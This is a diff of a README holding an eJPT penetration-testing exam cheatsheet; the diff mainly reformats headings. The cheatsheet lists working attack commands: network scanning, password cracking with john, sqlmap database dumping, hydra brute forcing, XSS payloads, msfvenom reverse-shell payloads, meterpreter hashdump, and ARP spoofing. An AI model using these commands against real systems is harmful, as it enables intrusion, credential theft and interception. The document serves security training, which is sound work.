@@ -1,38 +1,38 @@
 # eJPT-Cheatsheet-Tips
 This is a Cheatsheet for eJPT exam.
 
-### Nmap
+## Nmap
 nmap -sn 10.10.10.0/24\
 nmap -sV -p- -iL targets -oN nmap.initial\
 nmap -A -p- -iL targets -oN nmap.aggressive\
 nmap -p<port> --script=vuln -v <target-IP>
 
-### fPing
+## fPing
 fping -a -g 10.10.10.0/24 > targets 2>/dev/null
 
-### IP Route
+## IP Route
 **Syntax**\
 *ip route add \<Network-range\> via \<router-IP\> dev \<interface\>\
 eg.\
 ip route add 172.16.50.0/24 via 10.13.37.1 dev tap0
 
-### John
+## John
 john --wordlist=/root/Tools/wordlists/rockyou.txt --format=raw-md5\
 unshadow passwd shadow > unshadowed.txt\
 john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
 
-### dirb
+## dirb
 dirb http://10.10.10.10/ \
 dirb http://10.10.10.10/dir -u admin:admin
 
-### Netcat
+## Netcat
 **Listening for reverse shell**\
 nc -nvlp 1234
 
 **Banner Grabbing**\
 nc -nv 10.10.10.10 <port>
 
-### SQLMap
+## SQLMap
 #### Check if injection exists
 sqlmap -r Post.req\
 sqlmap -u "http://10.10.10.10/file.php?id=1" -p id\
@@ -53,7 +53,7 @@ sqlmap -r login.req -D dbname -T table_name --dump\
 sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname -T table_name --dump\
 sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname -T table_name --dump
 
-### Hydra
+## Hydra
 **SSH Login Bruteforcing**\
 hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u 10.10.10.10 ssh\
 hydra -v -V -u -l root -P passwords.txt -t 1 -u 10.10.10.10 ssh\
@@ -65,14 +65,14 @@ hydra http://10.10.10.10/ http-post-form "/login.php:user=^USER^&password=^PASS^
 *You will know which wordlists to use when the time comes*
 
 
-### XSS
-<script>alert(1)</script>\
-<ScRiPt>alert(1)</ScRiPt>
+## XSS
+\<script\>alert(1)\</script\>\
+\<ScRiPt\>alert(1)\</ScRiPt\>
 
 *This is a great filter bypass cheatsheet*\
 https://owasp.org/www-community/xss-filter-evasion-cheatsheet
 
-### msfvenom shells
+## msfvenom shells
 **JSP Java Meterpreter Reverse TCP**\
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp
 
@@ -83,15 +83,15 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Por
 msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php\
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 
-### Metasploit Meterpreter autoroute
+## Metasploit Meterpreter autoroute
 run autoroute -s 10.10.10.0/24
 
-### ARPSpoof
+## ARPSpoof
 echo 1 > /proc/sys/net/ipv4/ip_forward\
 arpspoof -i <interface> -t <target> -r <host>\
 arpspoof -i tap0 -t 10.100.13.37 -r 10.100.13.36
 
-### SMB Enumeration
+## SMB Enumeration
 **Get shares, users, groups, password policy**\
 smbclient -L //10.10.10.10/\
 enum4linux -U -M -S -P -G 10.10.10.10\
@@ -101,14 +101,14 @@ nmap -p445 --script=smb-vuln-* 10.10.10.10 -v
 **Access Share**\
 smbclient //10.10.10.10/share_name
 
-### FTP Enumeration
+## FTP Enumeration
 nmap --script=ftp-anon 10.10.10.10 -p21 -v\
 nmap -A -p21 10.10.10.10 -v
 
 **Login to FTP server**\
 ftp 10.10.10.10
 
-### Meterpreter
+## Meterpreter
 ps\
 getuid\
 getpid\
@@ -127,7 +127,7 @@ set session
 migrate <pid>\
 hashdump
   
-### Windows Command Line
+## Windows Command Line
 **To search for a file starting from current directory**\
 dir /b/s "*.conf*\
 dir /b/s "*.txt*
